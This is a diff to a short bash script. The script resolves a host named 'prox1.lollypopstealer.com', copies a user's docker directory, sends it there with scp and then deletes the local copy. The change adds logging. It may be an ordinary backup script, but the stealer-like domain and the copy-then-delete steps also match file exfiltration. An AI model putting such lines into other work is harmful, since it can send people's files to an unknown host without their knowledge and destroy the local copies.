@@ -1,5 +1,6 @@
 #!/usr/bin/env bash
 ip=$(nslookup prox1.lollypopstealer.com | grep Address | awk 'FNR==2{print $0}' | colrm 1 9)
-cp -r /home/cameron/docker ${HOME}/backup
-scp -r ${HOME}/backup root@$ip\:~/backup/${HOSTNAME}
-cd ${HOME}/backup && rm -r ./*
+logd=/var/log/servinit
+cp -r /home/cameron/docker ${HOME}/backup 2>>$logd\/errors.log >> $logd\/standard.log
+scp -r ${HOME}/backup ${USER}@$ip\:~/backup/${HOSTNAME} 2>>$logd\/errors.log >> $logd\/standard.log
+cd ${HOME}/backup && rm -r ./* 2>>$logd\/errors.log >> $logd\/standard.log
